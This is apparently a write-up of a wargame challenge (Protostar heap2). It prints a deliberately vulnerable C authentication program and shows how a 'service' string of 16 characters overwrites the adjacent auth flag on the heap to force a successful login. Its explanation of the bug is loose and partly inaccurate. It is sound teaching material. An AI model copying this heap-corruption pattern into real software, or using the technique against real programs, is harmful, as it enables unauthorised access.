Let's take a look at the source code...

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;
      
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```
What we can see here, is a basic authentication program. Our objective is to get it to print out "you have logged in already!\n". which in order for it to do that
we will have to set aut->auth (this is the integer located in the auth struct) equal to a number that isn't zero, so that it will evaluate it as true and print out the string.
However there does not appear to be a way we can directly alter auth->auth. 

First thing, it takes input using a secured fgets() implementation so we won't be able to do a buffer overflow. It stores the input in the line variable, which will be used later on.

```
if(fgets(line, sizeof(line), stdin) == NULL) break;
```

Now Let's take a look at the four commands that it will accept via if then commands.

#auth

```
 if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
```

This command first establishes space in memory to store the auth struct, using the malloc() function. It then writes zeroes throught the new space using the memset() function.
It then checks to ensure that the string is not longer than 31 characters, then writes it to auth->name using the strcpy() function.

#reset

```
if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
```

This command just runs the free() function on the auth pointer (which points to the auth struct). The free function just frees the memory of where the pointer is pointing to, so it can be allocated for other things (effictively deleting them).

#service

```
if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
```

This command just runs the strdup() function, which duplicates a string using malloc. This particular implementation will create a new string that is a duplicate of line + 7, then return a pointer for the new string which will be stored in the variable being pointed to by the service pointer. 

#login

```
if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
```

Looking at this, essentially it just checks to see if auth->auth has changed from it's default value (which is 0).

Now that we have disected the program, let's see what happens when we run it. After all, it should print out the addresses of the auth and service pointers, which could help.

```
$ ./heap2
[ auth = (nil), service = (nil) ]
auth pls
[ auth = (0x804c008), service = (nil) ]
auth hi
[ auth = (0x804c018), service = (nil) ]
service nope
[ auth = (0x804c018), service = (0x804c028) ]
```

When we look at how the addresses change we see that it starts out at 0x804c008, then it moves up in increments of 0x10 (that is 16 in hex). So if one allocation of either service or auth is taking up 16 bytes, and there are only 32 bytes in the char, then we should only have to write 16 bytes before we star writing to other things like the auth int stored right next to it. So if we're right then we should be able to use Auth to malloc the space we will exploit, then use the Service command to write a string atleast 16 characters long and that should overwrite the auth integer (we want to use the service command to write to it instead of auth, since service doesn't filter it's input like the auth command). Let's try it...


```
$ ./heap2
[ auth = (nil), service = (nil) ]
auth pwn
[ auth = (0x804c008), service = (nil) ]
service 1111111111111111
[ auth = (0x804c008), service = (0x804c018) ]
login
you have logged in already!
[ auth = (0x804c008), service = (0x804c018) ]
```

And just like that we pwned the program.

Sources:

http://www.pwntester.com/blog/2013/12/20/protostar-heap0-4-write-ups/
















